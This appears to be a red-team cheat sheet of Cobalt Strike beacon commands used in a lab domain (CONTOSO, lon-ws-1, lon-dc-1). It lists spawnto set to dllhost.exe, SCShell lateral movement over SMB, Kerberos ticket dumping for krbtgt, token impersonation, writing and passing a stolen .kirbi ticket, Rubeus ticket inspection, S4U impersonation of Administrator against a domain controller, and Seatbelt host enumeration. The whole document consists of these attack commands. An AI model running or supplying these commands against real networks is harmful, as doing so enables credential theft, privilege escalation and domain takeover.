```
spawnto x64 C:\Windows\System32\dllhost.exe
ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
jump scshell64 lon-ws-1 smb

krb_dump [/luid:LOGINID] [/user:USER] [/service:SERVICE] [/client:CLIENT]

krb_dump /luid:3e7 /service:krbtgt

make_token CONTOSO\user FakePass

$ticket = "doIFo[...snip...]kNPTQ=="
[IO.File]::WriteAllBytes("C:\Users\Attacker\Desktop\ticket.kirbi", [Convert]::FromBase64String($ticket))

kerberos_ticket_use C:\Users\Attacker\Desktop\ticket.kirbi

C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIF8[...snip...]MtMSQ=

krb_s4u /ticket:[TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator



execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=all > output.txt
```